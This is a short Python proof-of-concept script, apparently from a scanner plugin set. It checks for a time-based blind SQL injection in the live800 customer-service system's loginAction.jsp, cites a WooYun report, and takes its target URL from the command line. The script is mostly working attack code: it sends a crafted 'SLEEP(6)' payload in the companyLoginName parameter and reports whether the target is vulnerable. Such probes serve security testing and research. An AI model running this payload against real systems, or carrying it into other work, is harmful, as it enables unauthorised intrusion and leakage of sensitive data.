#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800在线客服系统loginAction SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0147511
author: Lucifer
description: 文件/live800/loginAction.jsp中,参数companyLoginName存在时间盲注,导致敏感信息泄露。
'''
import sys
import time
import requests
import warnings
def run(url):
        result = ['live800在线客服系统loginAction SQL注入漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/live800/loginAction.jsp?companyLoginName=1%27Or(SeLeCt%20SlEeP(6))%23&loginName=a&password=a"
        vulnurl = url + payload
        start_time = time.time()
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if time.time() - start_time >= 6:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
